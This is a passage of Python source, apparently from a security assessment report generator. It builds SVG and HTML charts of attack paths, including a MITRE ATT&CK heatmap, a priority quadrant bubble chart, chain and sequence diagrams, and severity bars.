    w = label_w + len(tactics) * cell_w + 20
    h = header_h + len(techniques) * cell_h + 20

    cells = []
    # Column headers (tactics) — horizontal for readability
    for ci, tactic in enumerate(tactics):
        x = label_w + ci * cell_w + cell_w // 2
        cells.append(
            f'<text x="{x}" y="{header_h - 12}" text-anchor="middle" fill="var(--text-secondary)"'
            f' font-size="11" font-weight="600">{_esc(tactic)}</text>'
        )

    # Row labels (techniques) + cells
    for ri, tech in enumerate(techniques):
        y = header_h + ri * cell_h
        cells.append(
            f'<text x="{label_w - 8}" y="{y + cell_h // 2 + 4}" text-anchor="end"'
            f' fill="var(--text)" font-size="11" font-family="var(--font-mono)">{_esc(tech)}</text>'
        )
        for ci, tactic in enumerate(tactics):
            x = label_w + ci * cell_w
            count = tech_map[tech]["tactics"].get(tactic, 0)
            if count > 0:
                opacity = 0.3 + 0.7 * (count / max_count)
                sev_paths = [p for p in paths if p.get("MitreTechnique") == tech and p.get("MitreTactic") == tactic]
                max_sev = min(sev_paths, key=lambda p: _SEVERITY_ORDER.get(p.get("Severity", "informational").lower(), 4), default=None)
                color = _SEVERITY_COLORS.get(max_sev.get("Severity", "informational").lower(), "#6B6B6B") if max_sev else "#6B6B6B"
                cells.append(
                    f'<rect x="{x + 2}" y="{y + 2}" width="{cell_w - 4}" height="{cell_h - 4}"'
                    f' rx="4" fill="{color}" opacity="{opacity:.2f}">'
                    f'<title>{_esc(tech)} / {_esc(tactic)}: {count} path(s)</title></rect>'
                )
                cells.append(
                    f'<text x="{x + cell_w // 2}" y="{y + cell_h // 2 + 4}" text-anchor="middle"'
                    f' fill="#fff" font-size="12" font-weight="600">{count}</text>'
                )
            else:
                cells.append(
                    f'<rect x="{x + 2}" y="{y + 2}" width="{cell_w - 4}" height="{cell_h - 4}"'
                    f' rx="4" fill="var(--border)" opacity="0.3"/>'
                )

    return f"""<svg width="{w}" height="{h}" viewBox="0 0 {w} {h}" role="img"
     aria-label="MITRE ATT&CK heatmap showing technique coverage across tactics"
     style="max-width:100%;overflow:visible">
  {"".join(cells)}
</svg>"""


def _priority_quadrant_svg(paths: list[dict]) -> str:
    """4-quadrant bubble chart: x = frequency, y = risk score, sized by count.

    Enhancements for scalability & readability:
      • Quadrant labels rendered OUTSIDE the plot box (top & bottom strips) so the full
        box interior is available for bubbles — no collision with MONITOR/CRITICAL ACTION text.
      • Size legend moved to a dedicated strip below the chart.
      • Proper SVG arrow markers on both axes.
      • Square-root bubble sizing → small counts remain visible, large counts don't dominate.
      • Force-directed collision resolution for bubbles AND labels.
      • Count rendered inside every bubble; type label in a rounded pill with connector line.
      • Y-axis gridlines + tick labels (0/25/50/75/100), X-axis frequency ticks.
    """
    w, h = 1140, 680
    # Extra top padding for MONITOR/CRITICAL ACTION strip, extra bottom for LOW PRIORITY/QUICK WINS strip + axis arrow + label
    pad_l, pad_r, pad_t, pad_b = 92, 48, 72, 112

    # Group by type, compute avg score and count
    by_type: dict[str, list[dict]] = {}
    for p in paths:
        by_type.setdefault(p.get("Type", "unknown"), []).append(p)

    if not by_type:
        return ""

    bubbles = []
    for ptype, group in by_type.items():
        avg_score = sum(p.get("RiskScore", 0) for p in group) / len(group)
        count = len(group)
        max_sev = min(group, key=lambda p: _SEVERITY_ORDER.get(p.get("Severity", "informational").lower(), 4))
        color = _SEVERITY_COLORS.get(max_sev.get("Severity", "informational").lower(), "#6B6B6B")
        # Sqrt sizing: r grows ~ sqrt(count). Range 14–38 for any count.
        r = max(14, min(14 + int(math.sqrt(count) * 6), 38))
        bubbles.append({"type": ptype, "x": count, "y": avg_score, "r": r, "color": color, "count": count, "avg_score": avg_score})

    max_x = max(b["x"] for b in bubbles) or 1
    max_y = 100

    # Chart rectangle
    chart_l, chart_r = pad_l, w - pad_r
    chart_t, chart_b = pad_t, h - pad_b
    mid_x = (chart_l + chart_r) / 2
    mid_y = (chart_t + chart_b) / 2

    svg_parts = [
        f'<svg width="100%" viewBox="0 0 {w} {h}" preserveAspectRatio="xMidYMid meet" role="img"'
        f' aria-label="Priority quadrant showing attack path types by frequency and risk score"'
        f' style="max-width:1240px;display:block;margin:0 auto">',
        # Drop-shadow + arrow-marker defs
        '<defs>'
        '<filter id="qdShadow" x="-20%" y="-20%" width="140%" height="140%">'
        '<feDropShadow dx="0" dy="2" stdDeviation="2" flood-opacity="0.28"/>'
        '</filter>'
        # Arrow markers used on the axis arrows themselves
        '<marker id="qdArrowEnd" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="9" markerHeight="9" orient="auto-start-reverse">'
        '<path d="M0,0 L10,5 L0,10 z" fill="currentColor"/>'
        '</marker>'
        '</defs>',
        # ── Quadrant header strip (TOP - outside the plot box) ──
        f'<g class="qd-hdr">'
        f'<rect x="{chart_l}" y="{chart_t - 38}" width="{(chart_r - chart_l) / 2:.1f}" height="30" rx="6" ry="6" fill="rgba(128,128,128,0.10)" stroke="rgba(128,128,128,0.30)"/>'
        f'<rect x="{mid_x:.1f}" y="{chart_t - 38}" width="{(chart_r - chart_l) / 2:.1f}" height="30" rx="6" ry="6" fill="rgba(209,52,56,0.10)" stroke="rgba(209,52,56,0.45)"/>'
        f'<text x="{(chart_l + mid_x) / 2:.1f}" y="{chart_t - 17}" text-anchor="middle" fill="var(--text-muted)" font-size="12" font-weight="800" letter-spacing="1.5">◻ MONITOR</text>'
        f'<text x="{(mid_x + chart_r) / 2:.1f}" y="{chart_t - 17}" text-anchor="middle" fill="#D13438" font-size="12" font-weight="800" letter-spacing="1.5">● CRITICAL ACTION</text>'
        f'</g>',
        # Quadrant fills inside the box — now lighter since the labels moved out
        f'<rect x="{chart_l}" y="{chart_t}" width="{mid_x - chart_l}" height="{mid_y - chart_t}" fill="var(--bg-card)" opacity="0.35"/>',
        f'<rect x="{mid_x}" y="{chart_t}" width="{chart_r - mid_x}" height="{mid_y - chart_t}" fill="rgba(209,52,56,0.05)"/>',
        f'<rect x="{chart_l}" y="{mid_y}" width="{mid_x - chart_l}" height="{chart_b - mid_y}" fill="rgba(16,124,16,0.05)"/>',
        f'<rect x="{mid_x}" y="{mid_y}" width="{chart_r - mid_x}" height="{chart_b - mid_y}" fill="rgba(255,185,0,0.05)"/>',
        # Plot outer border
        f'<rect x="{chart_l}" y="{chart_t}" width="{chart_r - chart_l}" height="{chart_b - chart_t}" fill="none" stroke="var(--border)" stroke-width="1"/>',
    ]

    # Horizontal gridlines at Y = 25/50/75 (and the main 50 axis)
    for y_pct in (25, 50, 75):
        yy = chart_b - (y_pct / max_y) * (chart_b - chart_t)
        dash = "0" if y_pct == 50 else "2,4"
        stroke = "var(--border)" if y_pct == 50 else "rgba(128,128,128,0.25)"
        svg_parts.append(
            f'<line x1="{chart_l}" y1="{yy:.1f}" x2="{chart_r}" y2="{yy:.1f}" stroke="{stroke}" stroke-dasharray="{dash}"/>'
        )
        svg_parts.append(
            f'<text x="{chart_l - 8}" y="{yy + 3:.1f}" text-anchor="end" fill="var(--text-muted)" font-size="10" font-family="var(--font-mono)">{y_pct}</text>'
        )
    # Top / bottom Y labels
    svg_parts.append(f'<text x="{chart_l - 8}" y="{chart_t + 4}" text-anchor="end" fill="var(--text-muted)" font-size="10" font-family="var(--font-mono)">100</text>')
    svg_parts.append(f'<text x="{chart_l - 8}" y="{chart_b + 4}" text-anchor="end" fill="var(--text-muted)" font-size="10" font-family="var(--font-mono)">0</text>')

    # Vertical middle axis (frequency midpoint)
    svg_parts.append(
        f'<line x1="{mid_x}" y1="{chart_t}" x2="{mid_x}" y2="{chart_b}" stroke="var(--border)" stroke-dasharray="4"/>'
    )
    # X-axis ticks: 0 … max_x
    for frac, label in ((0.0, "0"), (0.5, f"{max_x // 2 if max_x > 1 else 1}"), (1.0, f"{max_x}")):
        xx = chart_l + frac * (chart_r - chart_l)
        svg_parts.append(
            f'<text x="{xx:.1f}" y="{chart_b + 16}" text-anchor="middle" fill="var(--text-muted)" font-size="10" font-family="var(--font-mono)">{label}</text>'
        )

    # ── Quadrant footer strip (BOTTOM - outside the plot box) ──
    svg_parts.append(
        f'<g class="qd-ftr">'
        f'<rect x="{chart_l}" y="{chart_b + 26}" width="{(chart_r - chart_l) / 2:.1f}" height="30" rx="6" ry="6" fill="rgba(16,124,16,0.10)" stroke="rgba(16,124,16,0.45)"/>'
        f'<rect x="{mid_x:.1f}" y="{chart_b + 26}" width="{(chart_r - chart_l) / 2:.1f}" height="30" rx="6" ry="6" fill="rgba(255,185,0,0.12)" stroke="rgba(255,185,0,0.55)"/>'
        f'<text x="{(chart_l + mid_x) / 2:.1f}" y="{chart_b + 46}" text-anchor="middle" fill="#107C10" font-size="12" font-weight="800" letter-spacing="1.5">● LOW PRIORITY</text>'
        f'<text x="{(mid_x + chart_r) / 2:.1f}" y="{chart_b + 46}" text-anchor="middle" fill="#B88200" font-size="12" font-weight="800" letter-spacing="1.5">● QUICK WINS</text>'
        f'</g>'
    )

    # ── Axis arrows (real SVG arrows with markers) ──
    # X-axis arrow: along the bottom of the plot, pointing RIGHT
    svg_parts.append(
        f'<g color="var(--text-secondary)">'
        f'<line x1="{chart_l}" y1="{chart_b + 68}" x2="{chart_r - 4}" y2="{chart_b + 68}" stroke="currentColor" stroke-width="1.5" marker-end="url(#qdArrowEnd)"/>'
        f'<text x="{mid_x:.1f}" y="{chart_b + 88}" text-anchor="middle" fill="currentColor" font-size="12" font-weight="700">Frequency (number of paths)</text>'
        f'</g>'
    )
    # Y-axis arrow: along the left of the plot, pointing UP
    svg_parts.append(
        f'<g color="var(--text-secondary)">'
        f'<line x1="{pad_l - 44}" y1="{chart_b}" x2="{pad_l - 44}" y2="{chart_t + 4}" stroke="currentColor" stroke-width="1.5" marker-end="url(#qdArrowEnd)"/>'
        f'<text x="{pad_l - 58}" y="{mid_y:.1f}" text-anchor="middle" fill="currentColor" font-size="12" font-weight="700" transform="rotate(-90 {pad_l - 58} {mid_y:.1f})">Risk Score (0–100)</text>'
        f'</g>'
    )

    # ── Bubble placement with collision avoidance ──
    # 1) Compute ideal position from data.
    # 2) Resolve bubble-vs-bubble overlaps with iterative force-directed nudge.
    # 3) Pick a label slot (below / above / right / left) that doesn't collide with
    #    other bubbles or other labels, then draw the label in a rounded pill.
    placed_bubbles: list[tuple[float, float, float]] = []   # (x, y, r)
    placed_labels: list[tuple[float, float, float, float]] = []  # label bboxes (x1,y1,x2,y2)
    bubble_positions = []  # resolved positions we will render after

    # Sort bubbles largest first so big ones win the prime real estate
    bubbles.sort(key=lambda b: -b["r"])

    for b in bubbles:
        # Ideal x/y based on data. Inset from edges by the largest bubble radius.
        bx = chart_l + 40 + (b["x"] / max_x) * (chart_r - chart_l - 80)
        by = chart_b - 36 - (b["y"] / max_y) * (chart_b - chart_t - 72)
        # Force-directed collision resolution (more iterations for crowded charts)
        for _pass in range(40):
            nudged = False
            for px, py, pr in placed_bubbles:
                dist = math.sqrt((bx - px) ** 2 + (by - py) ** 2)
                # Need gap = both radii + ~24px cushion (room for pill labels)
                min_dist = b["r"] + pr + 28
                if dist < min_dist:
                    if dist > 0.1:
                        dx = (bx - px) / dist
                        dy = (by - py) / dist
                    else:
                        # Identical position — push along a deterministic pseudo-random vector
                        angle = (len(placed_bubbles) * 37 + 13) % 360
                        dx = math.cos(math.radians(angle))
                        dy = math.sin(math.radians(angle))
                    push = (min_dist - dist) * 0.55 + 3
                    bx += dx * push
                    by += dy * push
                    nudged = True
            if not nudged:
                break
        # Clamp bubble inside chart
        bx = max(chart_l + b["r"] + 8, min(bx, chart_r - b["r"] - 8))
        by = max(chart_t + b["r"] + 12, min(by, chart_b - b["r"] - 28))
        placed_bubbles.append((bx, by, b["r"]))
        bubble_positions.append((b, bx, by))

    # Render bubbles + inside count + label pills
    def _pill_bbox(cx: float, cy: float, text_w: float, text_h: float) -> tuple[float, float, float, float]:
        pad_h = 7
        pad_v = 3
        return (cx - text_w / 2 - pad_h, cy - text_h / 2 - pad_v,
                cx + text_w / 2 + pad_h, cy + text_h / 2 + pad_v)

    def _bbox_overlaps(a: tuple[float, float, float, float], b_: tuple[float, float, float, float]) -> bool:
        return not (a[2] < b_[0] or b_[2] < a[0] or a[3] < b_[1] or b_[3] < a[1])

    def _bbox_hits_bubble(bb: tuple[float, float, float, float], px: float, py: float, pr: float) -> bool:
        # Distance from bubble center to closest point on bbox
        cx = max(bb[0], min(px, bb[2]))
        cy = max(bb[1], min(py, bb[3]))
        return (px - cx) ** 2 + (py - cy) ** 2 < (pr + 2) ** 2

    for b, bx, by in bubble_positions:
        label_text = _TYPE_LABELS.get(b["type"], b["type"])
        # Approximate text width: 6.2px per char at font-size 11.5
        text_w = max(40.0, min(len(label_text) * 6.3, 200.0))
        text_h = 13.0
        # Try slots in preference order: below, above, right, left
        slot_offset = b["r"] + 14
        candidates = [
            (bx, by + slot_offset),  # below
            (bx, by - slot_offset),  # above
            (bx + slot_offset + text_w / 2, by),  # right
            (bx - slot_offset - text_w / 2, by),  # left
        ]
        chosen = None
        for lx, ly in candidates:
            bbox = _pill_bbox(lx, ly, text_w, text_h)
            # Must fit inside chart
            if bbox[0] < chart_l + 4 or bbox[2] > chart_r - 4 or bbox[1] < chart_t + 4 or bbox[3] > chart_b - 4:
                continue
            # Must not collide with any bubble (except its own)
            collides = False
            for px, py, pr in placed_bubbles:
                if abs(px - bx) < 0.5 and abs(py - by) < 0.5 and abs(pr - b["r"]) < 0.5:
                    continue
                if _bbox_hits_bubble(bbox, px, py, pr):
                    collides = True
                    break
            if collides:
                continue
            # Must not collide with other labels
            if any(_bbox_overlaps(bbox, lb) for lb in placed_labels):
                continue
            chosen = (lx, ly, bbox)
            break
        # Fallback: below the bubble, clamped
        if not chosen:
            lx, ly = bx, by + slot_offset
            ly = min(ly, chart_b - 10)
            bbox = _pill_bbox(lx, ly, text_w, text_h)
            chosen = (lx, ly, bbox)
        lx, ly, bbox = chosen
        placed_labels.append(bbox)

        # Bubble (with drop shadow for clarity)
        svg_parts.append(
            f'<circle cx="{bx:.0f}" cy="{by:.0f}" r="{b["r"]}" fill="{b["color"]}" opacity="0.88"'
            f' stroke="#ffffff" stroke-width="2" filter="url(#qdShadow)" class="qd-bubble" data-type="{_esc(b["type"])}">'
            f'<title>{_esc(label_text)}: {b["count"]} path(s), avg score {b["avg_score"]:.0f}/100</title>'
            f'</circle>'
        )
        # Count number inside bubble (white, bold) — only when radius ≥ 16
        if b["r"] >= 16:
            svg_parts.append(
                f'<text x="{bx:.0f}" y="{by + 4:.0f}" text-anchor="middle" fill="#ffffff"'
                f' font-size="{min(18, b["r"] - 2)}" font-weight="800" pointer-events="none" style="paint-order:stroke;stroke:rgba(0,0,0,0.35);stroke-width:0.6px">{b["count"]}</text>'
            )
        # Connector line from bubble edge to label center (only for non-below slots)
        if abs(ly - (by + slot_offset)) > 2:
            # Shorten the line so it doesn't enter the bubble
            dx, dy = lx - bx, ly - by
            dd = math.sqrt(dx * dx + dy * dy) or 1
            sx = bx + (dx / dd) * (b["r"] + 2)
            sy = by + (dy / dd) * (b["r"] + 2)
            svg_parts.append(
                f'<line x1="{sx:.1f}" y1="{sy:.1f}" x2="{lx:.1f}" y2="{ly:.1f}" stroke="{b["color"]}" stroke-width="1.2" opacity="0.5"/>'
            )
        # Label pill
        svg_parts.append(
            f'<rect x="{bbox[0]:.1f}" y="{bbox[1]:.1f}" width="{bbox[2] - bbox[0]:.1f}" height="{bbox[3] - bbox[1]:.1f}"'
            f' rx="7" ry="7" fill="var(--bg-elevated)" stroke="{b["color"]}" stroke-width="1" opacity="0.96"/>'
            f'<text x="{lx:.1f}" y="{ly + 4:.1f}" text-anchor="middle" fill="var(--text)" font-size="11" font-weight="600">{_esc(label_text)}</text>'
        )

    # Size legend rendered as HTML below the SVG — keeps the plot area clean and responsive.
    svg_parts.append('</svg>')
    svg_final = "\n".join(svg_parts)
    legend_html = (
        '<div class="qd-size-legend">'
        '<span class="qd-size-legend-h">Bubble size = path count</span>'
        '<span class="qd-size-item"><svg width="14" height="14"><circle cx="7" cy="7" r="5" fill="none" stroke="currentColor" stroke-width="1.2"/></svg>1</span>'
        '<span class="qd-size-item"><svg width="22" height="22"><circle cx="11" cy="11" r="9" fill="none" stroke="currentColor" stroke-width="1.2"/></svg>5</span>'
        '<span class="qd-size-item"><svg width="36" height="36"><circle cx="18" cy="18" r="15" fill="none" stroke="currentColor" stroke-width="1.2"/></svg>20+</span>'
        '<span class="qd-size-item" style="margin-left:auto"><span class="qd-dot" style="background:#D13438"></span>Critical severity</span>'
        '<span class="qd-size-item"><span class="qd-dot" style="background:#F7630C"></span>High</span>'
        '<span class="qd-size-item"><span class="qd-dot" style="background:#FFB900"></span>Medium</span>'
        '<span class="qd-size-item"><span class="qd-dot" style="background:#107C10"></span>Low / Info</span>'
        '</div>'
    )
    return f'<div class="qd-wrap">{svg_final}{legend_html}</div>'


def _chain_diagram_svg(path: dict) -> str:
    """Multi-node attack chain SVG diagram.

    Uses ChainNodes if available, otherwise parses Chain text on '→'.
    Nodes are color-coded by type with appropriate shapes.
    """
    nodes = path.get("ChainNodes")
    if not nodes:
        # Fallback: parse Chain text on →
        chain_text = path.get("Chain", "")
        parts = [p.strip() for p in chain_text.split("→") if p.strip()]
        if len(parts) < 2:
            # Split long text into logical segments
            words = chain_text.split()
            if len(words) > 8:
                mid = len(words) // 2
                parts = [" ".join(words[:mid]), " ".join(words[mid:])]
            else:
                parts = [chain_text] if chain_text else ["Unknown"]
        nodes = []
        for i, part in enumerate(parts):
            if i == 0:
                ntype = "identity"
            elif i == len(parts) - 1:
                ntype = "impact"
            else:
                ntype = "action"
            nodes.append({"type": ntype, "label": part[:50]})

    if not nodes:
        return ""

    node_w, node_h, gap = 160, 56, 36
    total_w = len(nodes) * node_w + (len(nodes) - 1) * gap + 24
    svg_h = node_h + 40

    sev = path.get("Severity", "informational").lower()
    arrow_color = _SEVERITY_COLORS.get(sev, "#6B6B6B")

    svg_parts = [
        f'<svg class="chain-diagram" width="{total_w}" height="{svg_h}"'
        f' viewBox="0 0 {total_w} {svg_h}" role="img"'
        f' aria-label="Attack chain diagram showing {len(nodes)} steps"'
        f' style="max-width:100%">',
        f'<defs>'
        f'<marker id="ap-arrow-{id(path) % 10000}" viewBox="0 0 10 10" refX="9" refY="5"'
        f' markerWidth="7" markerHeight="7" orient="auto-start-auto">'
        f'<path d="M 0 0 L 10 5 L 0 10 z" fill="{arrow_color}"/></marker>'
        f'<filter id="ap-shadow" x="-4%" y="-4%" width="108%" height="120%">'
        f'<feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="rgba(0,0,0,0.25)"/></filter>'
        f'</defs>',
    ]

    for i, node in enumerate(nodes):
        ntype = node.get("type", "action")
        label = node.get("label", "")
        style = _NODE_STYLES.get(ntype, _NODE_STYLES["action"])
        fill = style["fill"]
        icon = style.get("icon", "")

        x = 12 + i * (node_w + gap)
        y = 12

        # Draw node shape
        if style["shape"] == "rounded_rect":
            svg_parts.append(
                f'<rect x="{x}" y="{y}" width="{node_w}" height="{node_h}" rx="12"'
                f' fill="{fill}" opacity="0.15" stroke="{fill}" stroke-width="2" filter="url(#ap-shadow)"/>'
            )
        elif style["shape"] == "hexagon":
            pts = _hexagon_points(x, y, node_w, node_h)
            svg_parts.append(
                f'<polygon points="{pts}" fill="{fill}" opacity="0.15"'
                f' stroke="{fill}" stroke-width="2" filter="url(#ap-shadow)"/>'
            )
        elif style["shape"] == "diamond":
            cx, cy = x + node_w // 2, y + node_h // 2
            hw, hh = node_w // 2, node_h // 2
            pts = f"{cx},{y} {x + node_w},{cy} {cx},{y + node_h} {x},{cy}"
            svg_parts.append(
                f'<polygon points="{pts}" fill="{fill}" opacity="0.15"'
                f' stroke="{fill}" stroke-width="2" filter="url(#ap-shadow)"/>'
            )
        elif style["shape"] == "octagon":
            pts = _octagon_points(x, y, node_w, node_h)
            svg_parts.append(
                f'<polygon points="{pts}" fill="{fill}" opacity="0.15"'
                f' stroke="{fill}" stroke-width="2" filter="url(#ap-shadow)"/>'
            )
        elif style["shape"] == "parallelogram":
            skew = 10
            pts = f"{x + skew},{y} {x + node_w},{y} {x + node_w - skew},{y + node_h} {x},{y + node_h}"
            svg_parts.append(
                f'<polygon points="{pts}" fill="{fill}" opacity="0.15"'
                f' stroke="{fill}" stroke-width="2" filter="url(#ap-shadow)"/>'
            )
        else:
            svg_parts.append(
                f'<rect x="{x}" y="{y}" width="{node_w}" height="{node_h}" rx="4"'
                f' fill="{fill}" opacity="0.15" stroke="{fill}" stroke-width="2" filter="url(#ap-shadow)"/>'
            )

        # Type icon + label  (wrap into 2 lines when text exceeds node width)
        truncated = label if len(label) <= 48 else label[:45] + "…"
        max_chars_per_line = node_w // 8          # ~20 chars at 10px font in 160px box
        if len(truncated) > max_chars_per_line:
            # Split at last space within first line budget
            split_at = truncated.rfind(" ", 0, max_chars_per_line + 1)
            if split_at <= 0:
                split_at = max_chars_per_line
            line1 = truncated[:split_at].rstrip()
            line2 = truncated[split_at:].strip()
            if len(line2) > max_chars_per_line:
                line2 = line2[: max_chars_per_line - 1] + "…"
            svg_parts.append(
                f'<text x="{x + node_w // 2}" y="{y + 16}" text-anchor="middle"'
                f' fill="{fill}" font-size="14">{icon}</text>'
            )
            svg_parts.append(
                f'<text x="{x + node_w // 2}" y="{y + 32}" text-anchor="middle"'
                f' fill="var(--text)" font-size="10" font-family="var(--font-primary)">{_esc(line1)}</text>'
            )
            svg_parts.append(
                f'<text x="{x + node_w // 2}" y="{y + 45}" text-anchor="middle"'
                f' fill="var(--text)" font-size="10" font-family="var(--font-primary)">{_esc(line2)}</text>'
            )
        else:
            svg_parts.append(
                f'<text x="{x + node_w // 2}" y="{y + 20}" text-anchor="middle"'
                f' fill="{fill}" font-size="14">{icon}</text>'
            )
            svg_parts.append(
                f'<text x="{x + node_w // 2}" y="{y + 40}" text-anchor="middle"'
                f' fill="var(--text)" font-size="10.5" font-family="var(--font-primary)">{_esc(truncated)}</text>'
            )

        # Arrow to next node
        if i < len(nodes) - 1:
            ax1 = x + node_w + 4
            ax2 = x + node_w + gap - 6
            ay = y + node_h // 2
            svg_parts.append(
                f'<line x1="{ax1}" y1="{ay}" x2="{ax2}" y2="{ay}"'
                f' stroke="{arrow_color}" stroke-width="2.5"'
                f' marker-end="url(#ap-arrow-{id(path) % 10000})"/>'
            )

    svg_parts.append('</svg>')
    return "\n".join(svg_parts)


def _hexagon_points(x: int, y: int, w: int, h: int) -> str:
    """Generate hexagon polygon points."""
    inset = w // 6
    return (f"{x + inset},{y} {x + w - inset},{y} {x + w},{y + h // 2}"
            f" {x + w - inset},{y + h} {x + inset},{y + h} {x},{y + h // 2}")


def _octagon_points(x: int, y: int, w: int, h: int) -> str:
    """Generate octagon polygon points."""
    inset_x = w // 4
    inset_y = h // 4
    return (f"{x + inset_x},{y} {x + w - inset_x},{y} {x + w},{y + inset_y}"
            f" {x + w},{y + h - inset_y} {x + w - inset_x},{y + h}"
            f" {x + inset_x},{y + h} {x},{y + h - inset_y} {x},{y + inset_y}")


def _sequence_diagram_svg(path: dict) -> str:
    """Sequence diagram for multi-hop attack paths showing temporal flow."""
    nodes = path.get("ChainNodes")
    if not nodes or len(nodes) < 3:
        return ""

    col_w = 150
    row_h = 50
    header_h = 60
    w = len(nodes) * col_w + 40
    h = header_h + (len(nodes)) * row_h + 40

    sev = path.get("Severity", "informational").lower()
    arrow_color = _SEVERITY_COLORS.get(sev, "#6B6B6B")

    parts = [
        f'<svg class="sequence-diagram" width="{w}" height="{h}" viewBox="0 0 {w} {h}"'
        f' role="img" aria-label="Attack sequence diagram" style="max-width:100%">',
        f'<defs><marker id="seq-arrow-{id(path) % 10000}" viewBox="0 0 10 10" refX="9" refY="5"'
        f' markerWidth="6" markerHeight="6" orient="auto">'
        f'<path d="M 0 0 L 10 5 L 0 10 z" fill="{arrow_color}"/></marker></defs>',
    ]

    # Actor lifelines
    for i, node in enumerate(nodes):
        cx = 20 + i * col_w + col_w // 2
        style = _NODE_STYLES.get(node.get("type", "action"), _NODE_STYLES["action"])
        fill = style["fill"]
        label = node.get("label", "")[:20]

        # Actor box
        bw = col_w - 20
        parts.append(
            f'<rect x="{cx - bw // 2}" y="8" width="{bw}" height="36" rx="6"'
            f' fill="{fill}" opacity="0.2" stroke="{fill}" stroke-width="1.5"/>'
        )
        parts.append(
            f'<text x="{cx}" y="30" text-anchor="middle" fill="var(--text)"'
            f' font-size="10" font-weight="600">{_esc(label)}</text>'
        )
        # Lifeline
        parts.append(
            f'<line x1="{cx}" y1="44" x2="{cx}" y2="{h - 10}"'
            f' stroke="var(--border)" stroke-width="1" stroke-dasharray="4 3"/>'
        )

    # Messages (arrows between consecutive actors)
    for i in range(len(nodes) - 1):
        x1 = 20 + i * col_w + col_w // 2
        x2 = 20 + (i + 1) * col_w + col_w // 2
        y = header_h + i * row_h + 20

        parts.append(
            f'<line x1="{x1 + 4}" y1="{y}" x2="{x2 - 8}" y2="{y}"'
            f' stroke="{arrow_color}" stroke-width="2"'
            f' marker-end="url(#seq-arrow-{id(path) % 10000})"/>'
        )
        # Step label
        step_label = f"Step {i + 1}"
        parts.append(
            f'<text x="{(x1 + x2) // 2}" y="{y - 6}" text-anchor="middle"'
            f' fill="var(--text-secondary)" font-size="9" font-style="italic">{step_label}</text>'
        )

    parts.append('</svg>')
    return "\n".join(parts)


def _sequence_diagram_html(path: dict, index: int) -> str:
    """DOM-based animated sequence diagram with playback controls and explanation panel.

    Produces a container div with embedded JSON config. The report JS engine
    (initAllSeqDiagrams) reads the config and builds the interactive DOM:
    actor boxes with lifelines, animated arrows with risk gradient coloring,
    numbered step labels, side explanation panel, and playback controls.
    """
    nodes = path.get("ChainNodes", [])
    if not nodes or len(nodes) < 3:
        return ""

    sev = path.get("Severity", "informational").lower()
    mitre = path.get("MitreTechnique", "")
    mitre_tactic = path.get("MitreTactic", "")

    actors = []
    for node in nodes:
        ntype = node.get("type", "action")
        style = _NODE_STYLES.get(ntype, _NODE_STYLES["action"])
        actors.append({
            "name": node.get("label", "Unknown")[:48],
            "type": ntype,
            "icon": style.get("icon", "\u2192"),
            "color": style["fill"],
        })

    # Try the rich per-path-type template first; fall back to legacy generic 3-step builder.
    steps = _build_detailed_steps(path, len(nodes))
    if not steps:
        steps = []
        n_nodes = len(nodes)
        for i in range(n_nodes - 1):
            dst_type = nodes[i + 1].get("type", "action")
            step_info = _STEP_DESCRIPTIONS.get(dst_type, _STEP_DESCRIPTIONS["action"])
            progress = i / max(n_nodes - 2, 1)
            if progress < 0.33:
                arrow_color = "#107C10"
            elif progress < 0.66:
                arrow_color = "#FFB900"
            else:
                arrow_color = "#D13438"
            steps.append({
                "from": i, "to": i + 1,
                "label": step_info["title"],
                "title": step_info["title"],
                "desc": step_info["desc"],
                "why": step_info["desc"],
                "how": "",
                "tools": "",
                "api": "",
                "protocol": step_info.get("protocol", ""),
                "permission": step_info.get("permission", ""),
                "mitre": mitre if i == 0 else "",
                "detection": "",
                "prereq": "",
                "color": arrow_color,
            })

    config = json.dumps({"actors": actors, "steps": steps, "severity": sev,
                          "mitre": mitre, "tactic": mitre_tactic},
                         separators=(",", ":"))

    return (
        f'<div class="seq-diagram" id="seq-{index}">'
        f'<script type="application/json" class="seq-config">{config}</script>'
        f'<div class="seq-loading" style="text-align:center;padding:20px;color:var(--text-muted);font-size:12px">'
        f'Loading sequence diagram\u2026</div></div>'
    )


def _stacked_bar_svg(counts: dict, width: int = 400) -> str:
    """Horizontal stacked severity bar."""
    total = sum(counts.values())
    if total == 0:
        return '<div class="sev-bar-empty">No paths detected</div>'
    h = 28
    parts = [f'<svg width="{width}" height="{h}" viewBox="0 0 {width} {h}" role="img"'
             f' aria-label="Severity distribution bar" style="max-width:100%">']
    x = 0
    for sev in ("critical", "high", "medium", "low", "informational"):
        n = counts.get(sev, 0)
        if n == 0:
            continue
        seg_w = (n / total) * width
        color = _SEVERITY_COLORS[sev]
        rx = "6 0 0 6" if x == 0 else ("0 6 6 0" if sev == list(counts.keys())[-1] else "0")
        parts.append(
            f'<rect x="{x:.1f}" y="0" width="{seg_w:.1f}" height="{h}" fill="{color}" rx="2">'
            f'<title>{sev.capitalize()}: {n}</title></rect>'
        )
        if seg_w > 24:
            parts.append(
                f'<text x="{x + seg_w / 2:.1f}" y="{h / 2 + 4}" text-anchor="middle"'
                f' fill="#fff" font-size="11" font-weight="600">{n}</text>'
            )
        x += seg_w
    parts.append('</svg>')
    return "\n".join(parts)


def _sparkline_svg(values: list[int], w: int = 80, h: int = 24) -> str:
    """Tiny sparkline SVG."""
    if not values or all(v == 0 for v in values):
        return ""
    max_v = max(values) or 1
    points = []
    for i, v in enumerate(values):
        x = i / max(len(values) - 1, 1) * w
        y = h - (v / max_v) * (h - 4) - 2
        points.append(f"{x:.1f},{y:.1f}")
    return (f'<svg width="{w}" height="{h}" viewBox="0 0 {w} {h}">'
            f'<polyline points="{" ".join(points)}" fill="none" stroke="var(--primary)"'
            f' stroke-width="1.5" stroke-linecap="round"/></svg>')


# ── New Helper Functions ─────────────────────────────────────────────────

def _natural_language_summary(summary: dict, paths: list[dict]) -> str:
    """Data-driven narrative executive summary paragraph."""
    total = summary.get("TotalPaths", 0)
    counts = summary.get("SeverityCounts", {})
    score = summary.get("OverallRiskScore", 0)
    mitre_techs = summary.get("MitreTechniques", [])
    by_type = summary.get("PathsByType", {})
    crit = counts.get("critical", 0)
    high = counts.get("high", 0)
    med = counts.get("medium", 0)

    sev_parts = []
    if crit:
        sev_parts.append(f"<strong style='color:{_SEVERITY_COLORS['critical']}'>{crit} critical</strong>")
    if high:
        sev_parts.append(f"<strong style='color:{_SEVERITY_COLORS['high']}'>{high} high-severity</strong>")
    if med:
